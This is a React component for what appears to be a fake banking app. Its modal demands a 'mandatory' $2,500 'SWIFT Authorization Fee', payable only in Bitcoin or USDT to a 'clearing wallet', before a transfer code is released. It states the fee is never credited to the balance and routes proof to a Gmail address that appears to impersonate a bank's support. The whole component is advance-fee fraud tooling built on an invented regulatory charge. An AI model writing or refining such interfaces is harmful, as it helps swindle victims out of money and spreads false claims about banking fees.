import React, { useState } from 'react';
import { 
  X, 
  ShieldCheck, 
  Copy, 
  Check, 
  Upload, 
  ArrowRight, 
  AlertCircle, 
  CheckCircle2, 
  Globe, 
  Coins, 
  Lock,
  Clock,
  Sparkles
} from 'lucide-react';
import { UserProfile, FinancialSettings, PaymentMethod } from '../types';
import { store } from '../lib/store';
import { BrandLogo } from './BrandLogo';

interface SwiftCodeModalProps {
  isOpen: boolean;
  onClose: () => void;
  currentUser: UserProfile;
  settings: FinancialSettings;
}

export const SwiftCodeModal: React.FC<SwiftCodeModalProps> = ({
  isOpen,
  onClose,
  currentUser,
  settings
}) => {
  const [selectedMethod, setSelectedMethod] = useState<PaymentMethod>('BTC');
  const [txHash, setTxHash] = useState('');
  const [notes, setNotes] = useState('');
  const [proofImage, setProofImage] = useState<string>('');
  const [copiedAddress, setCopiedAddress] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [success, setSuccess] = useState(false);

  if (!isOpen) return null;

  const currentAddress = selectedMethod === 'BTC' ? settings.btcAddress : settings.usdtAddress;

  const handleCopy = () => {
    navigator.clipboard.writeText(currentAddress);
    setCopiedAddress(true);
    setTimeout(() => setCopiedAddress(false), 2000);
  };

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    if (file.size > 5 * 1024 * 1024) {
      setErrorMessage('Image size must be under 5MB.');
      return;
    }

    const reader = new FileReader();
    reader.onload = () => {
      setProofImage(reader.result as string);
      setErrorMessage('');
    };
    reader.readAsDataURL(file);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMessage('');

    if (!txHash.trim()) {
      setErrorMessage('Please provide the transaction hash or payment reference.');
      return;
    }

    setIsSubmitting(true);
    try {
      store.submitSwiftRequest({
        userId: currentUser.uid,
        paymentMethod: selectedMethod,
        txHashOrRef: txHash.trim(),
        proofImageUrl: proofImage || undefined,
        adminNotes: notes.trim() || undefined
      });

      setSuccess(true);
    } catch (err: any) {
      setErrorMessage(err.message || 'Failed to submit SWIFT verification request.');
    } finally {
      setIsSubmitting(false);
    }
  };

  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(currentAddress)}`;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/85 backdrop-blur-md animate-in fade-in duration-200">
      <div className="relative w-full max-w-lg bg-[#00172e] border border-blue-500/40 rounded-3xl shadow-2xl overflow-hidden text-white max-h-[92vh] flex flex-col">
        
        {/* Header Bar */}
        <div className="px-6 py-4 border-b border-[#002b52] flex items-center justify-between shrink-0 bg-[#001224]">
          <div className="flex items-center gap-3">
            <BrandLogo variant="horizontal" size="sm" />
            <div className="border-l border-blue-500/30 pl-3">
              <span className="text-[10px] font-bold uppercase tracking-wider text-cyan-400 block">
                Treasury & Wire Gateway
              </span>
              <h3 className="text-sm font-extrabold text-white">SWIFT Code Verification</h3>
            </div>
          </div>
          <button
            onClick={onClose}
            className="p-1.5 rounded-lg text-slate-400 hover:text-white hover:bg-[#002b52] transition-colors"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Content Body */}
        <div className="p-6 overflow-y-auto space-y-5">
          {success ? (
            <div className="text-center py-6 space-y-4">
              <div className="w-16 h-16 mx-auto rounded-full bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400">
                <CheckCircle2 className="w-10 h-10" />
              </div>
              <h3 className="text-lg font-black text-white">Verification Dispatched for Aegis Review</h3>
              <p className="text-xs text-slate-300 leading-relaxed max-w-md mx-auto">
                Your SWIFT clearing deposit proof of <span className="font-bold text-emerald-400">$2,500.00 USD</span> has been securely transmitted to the Aegis Clearing & Verification queue (<span className="font-mono text-cyan-300">newzelebarclaysupport@gmail.com</span>).
              </p>
              <div className="p-4 rounded-2xl bg-[#002040] border border-[#003866] text-left text-xs space-y-2">
                <div className="flex justify-between text-slate-400">
                  <span>Customer Account:</span>
                  <span className="font-mono text-white font-bold">{currentUser.accountNumber}</span>
                </div>
                <div className="flex justify-between text-slate-400">
                  <span>Payment Gateway:</span>
                  <span className="font-semibold text-white">{selectedMethod === 'BTC' ? 'Bitcoin Network (Native)' : 'USDT (Ethereum ERC-20)'}</span>
                </div>
                <div className="flex justify-between text-slate-400">
                  <span>Verification Status:</span>
                  <span className="text-amber-400 font-bold">Pending Aegis Review</span>
                </div>
              </div>
              <p className="text-[11px] text-slate-400">
                Once Aegis clearance is completed, your authorized 4-digit SWIFT transfer code will be dispatched directly to your in-app notifications.
              </p>
              <button
                onClick={onClose}
                className="w-full py-3 rounded-xl bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-400 hover:to-blue-500 text-white font-bold text-xs shadow-lg transition-all"
              >
                Return to Dashboard
              </button>
            </div>
          ) : (
            <form onSubmit={handleSubmit} className="space-y-4">
              {/* Fee Notice Banner */}
              <div className="p-4 rounded-2xl bg-gradient-to-r from-blue-950/60 to-cyan-950/40 border border-cyan-500/30 flex items-center justify-between">
                <div>
                  <span className="text-[10px] font-bold uppercase tracking-wider text-cyan-400 block">
                    Mandatory Regulatory Clearance
                  </span>
                  <h4 className="text-base font-black text-white mt-0.5">SWIFT Authorization Fee</h4>
                  <p className="text-[11px] text-slate-300 mt-0.5">
                    Required for high-speed domestic and cross-border 30+ country wire transfers.
                  </p>
                </div>
                <div className="text-right shrink-0">
                  <span className="text-2xl font-black font-mono text-emerald-400">$2,500</span>
                  <span className="text-[10px] block text-slate-400">USD One-Time</span>
                </div>
              </div>

              {errorMessage && (
                <div className="p-3 rounded-xl bg-rose-950/70 border border-rose-800 text-rose-200 text-xs flex items-center gap-2">
                  <AlertCircle className="w-4 h-4 text-rose-400 shrink-0" />
                  <span>{errorMessage}</span>
                </div>
              )}

              {/* Crypto Method Tabs with Authentic High-Quality Vector Logos */}
              <div>
                <label className="block text-xs font-semibold text-slate-300 mb-2">
                  Select Clearing Deposit Method:
                </label>
                <div className="grid grid-cols-2 gap-2">
                  <button
                    type="button"
                    onClick={() => setSelectedMethod('BTC')}
                    className={`p-3 rounded-xl border text-left flex items-center gap-3 transition-all ${
                      selectedMethod === 'BTC'
                        ? 'bg-amber-500/15 border-amber-500/60 text-white shadow-md shadow-amber-500/10'
                        : 'bg-[#002040] border-[#003866] text-slate-300 hover:bg-[#002850]'
                    }`}
                  >
                    <div className="w-9 h-9 rounded-full bg-[#F7931A] text-white flex items-center justify-center shrink-0 shadow">
                      {/* Authentic Bitcoin Vector SVG */}
                      <svg viewBox="0 0 32 32" className="w-5 h-5" fill="currentColor">
                        <path d="M23.189 14.02c0.314-2.096-1.283-3.223-3.465-3.975l0.708-2.84-1.728-0.43-0.69 2.765c-0.454-0.114-0.922-0.221-1.387-0.327l0.695-2.784-1.727-0.431-0.709 2.839c-0.376-0.086-0.744-0.17-1.103-0.26l0.002-0.009-2.384-0.595-0.46 1.846s1.283 0.294 1.256 0.312c0.7 0.175 0.826 0.638 0.805 1.006l-0.806 3.235c0.048 0.012 0.11 0.03 0.18 0.057l-0.183-0.045-1.13 4.532c-0.086 0.212-0.303 0.531-0.793 0.41 0.018 0.025-1.256-0.313-1.256-0.313l-0.858 1.978 2.25 0.561c0.418 0.105 0.828 0.215 1.232 0.318l-0.715 2.872 1.727 0.43 0.708-2.84c0.472 0.127 0.931 0.245 1.378 0.357l-0.702 2.809 1.728 0.432 0.715-2.866c2.948 0.558 5.164 0.333 6.097-2.333 0.752-2.146-0.037-3.385-1.588-4.192 1.13-0.26 1.98-1.003 2.207-2.538zM19.105 19.345c-0.535 2.146-4.152 0.986-5.325 0.694l0.95-3.808c1.172 0.293 4.929 0.873 4.375 3.114zM19.82 13.913c-0.488 1.954-3.5 0.962-4.477 0.718l0.861-3.454c0.977 0.244 4.123 0.7 3.616 2.736z"/>
                      </svg>
                    </div>
                    <div>
                      <p className="text-xs font-bold leading-tight">Bitcoin</p>
                      <p className="text-[10px] text-slate-400">BTC Native (SegWit)</p>
                    </div>
                  </button>

                  <button
                    type="button"
                    onClick={() => setSelectedMethod('USDT_ERC20')}
                    className={`p-3 rounded-xl border text-left flex items-center gap-3 transition-all ${
                      selectedMethod === 'USDT_ERC20'
                        ? 'bg-emerald-500/15 border-emerald-500/60 text-white shadow-md shadow-emerald-500/10'
                        : 'bg-[#002040] border-[#003866] text-slate-300 hover:bg-[#002850]'
                    }`}
                  >
                    <div className="w-9 h-9 rounded-full bg-[#26A17B] text-white flex items-center justify-center shrink-0 shadow">
                      {/* Authentic Tether USDT Vector SVG */}
                      <svg viewBox="0 0 32 32" className="w-5 h-5" fill="currentColor">
                        <path d="M17.922 17.383v-.002c-.11.008-.677.042-1.942.042-1.01 0-1.721-.03-1.971-.042v.003c-3.888-.171-6.79-1.017-6.79-2.032 0-1.014 2.902-1.86 6.79-2.031v3.242c.25.015.968.046 1.98.046 1.256 0 1.823-.035 1.933-.046v-3.242c3.884.171 6.782 1.017 6.782 2.031 0 1.015-2.898 1.861-6.782 2.031m0-4.664v-2.73h5.923V6h-15.89v3.99h5.976v2.73c-4.464.205-7.801 1.258-7.801 2.53 0 1.271 3.337 2.324 7.801 2.53v8.21h3.991v-8.21c4.46-.205 7.794-1.259 7.794-2.53 0-1.272-3.334-2.325-7.794-2.53"/>
                      </svg>
                    </div>
                    <div>
                      <p className="text-xs font-bold leading-tight">Tether USD</p>
                      <p className="text-[10px] text-slate-400">Ethereum ERC-20</p>
                    </div>
                  </button>
                </div>
              </div>

              {/* Dynamic Clearing Wallet Display */}
              <div className="p-4 rounded-2xl bg-[#002040] border border-[#003866] space-y-3">
                <div className="flex items-center justify-between text-xs">
                  <span className="text-slate-400 font-medium">Official Aegis Clearing Deposit Wallet:</span>
                  <span className="text-[10px] text-emerald-400 font-mono flex items-center gap-1">
                    <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping" />
                    Live Clearing Address
                  </span>
                </div>

                <div className="flex items-center gap-3">
                  <div className="p-1.5 rounded-xl bg-white shrink-0">
                    <img src={qrUrl} alt="Deposit QR" className="w-20 h-20" />
                  </div>
                  <div className="flex-1 min-w-0">
                    <div className="p-2.5 rounded-xl bg-[#00172e] border border-[#002b52] font-mono text-xs text-cyan-300 break-all select-all leading-relaxed">
                      {currentAddress}
                    </div>
                    <button
                      type="button"
                      onClick={handleCopy}
                      className="mt-2 text-xs font-bold text-cyan-400 hover:text-cyan-300 flex items-center gap-1.5 transition-colors"
                    >
                      {copiedAddress ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                      <span>{copiedAddress ? 'Address Copied!' : 'Copy Wallet Address'}</span>
                    </button>
                  </div>
                </div>
              </div>

              {/* Transaction Hash / Proof Field */}
              <div>
                <label className="block text-xs font-semibold text-slate-300 mb-1">
                  Blockchain Transaction Hash / Reference ID <span className="text-cyan-400">*</span>
                </label>
                <input
                  type="text"
                  value={txHash}
                  onChange={(e) => setTxHash(e.target.value)}
                  placeholder="e.g. 0x3f98a2... or btc txid"
                  className="w-full bg-[#002040] border border-[#003866] rounded-xl px-3.5 py-2.5 text-xs text-white placeholder-slate-400 font-mono focus:outline-none focus:border-cyan-400"
                  required
                />
              </div>

              {/* Proof Screenshot Upload */}
              <div>
                <label className="block text-xs font-semibold text-slate-300 mb-1">
                  Upload Payment Proof / Receipt Screenshot (Optional)
                </label>
                <div className="relative border-2 border-dashed border-[#003866] hover:border-cyan-500/60 rounded-xl p-3 text-center transition-colors">
                  <input
                    type="file"
                    accept="image/*"
                    onChange={handleFileUpload}
                    className="absolute inset-0 w-full h-full opacity-0 cursor-pointer"
                  />
                  {proofImage ? (
                    <div className="flex items-center justify-center gap-3">
                      <img src={proofImage} alt="Receipt preview" className="w-12 h-12 object-cover rounded-lg border border-cyan-400" />
                      <div className="text-left">
                        <p className="text-xs font-bold text-emerald-400">Proof image attached</p>
                        <p className="text-[10px] text-slate-400">Click to change image</p>
                      </div>
                    </div>
                  ) : (
                    <div className="flex items-center justify-center gap-2 text-xs text-slate-400">
                      <Upload className="w-4 h-4 text-cyan-400" />
                      <span>Attach transfer screenshot (PNG, JPG up to 5MB)</span>
                    </div>
                  )}
                </div>
              </div>

              {/* Submit CTA */}
              <button
                type="submit"
                disabled={isSubmitting || !txHash.trim()}
                className="w-full py-3.5 px-4 rounded-xl bg-gradient-to-r from-emerald-500 to-cyan-500 hover:from-emerald-400 hover:to-cyan-400 text-slate-950 font-black text-xs shadow-lg shadow-cyan-500/20 flex items-center justify-center gap-2 transition-all disabled:opacity-50 cursor-pointer"
              >
                {isSubmitting ? 'Transmitting for Aegis Review...' : 'I Have Deposited ($2,500)'}
                <ArrowRight className="w-4 h-4" />
              </button>

              <p className="text-[10px] text-center text-slate-400">
                Notice: The $2,500 deposit is a dedicated SWIFT authorization fee and is not credited to your available balance.
              </p>
            </form>
          )}
        </div>
      </div>
    </div>
  );
};
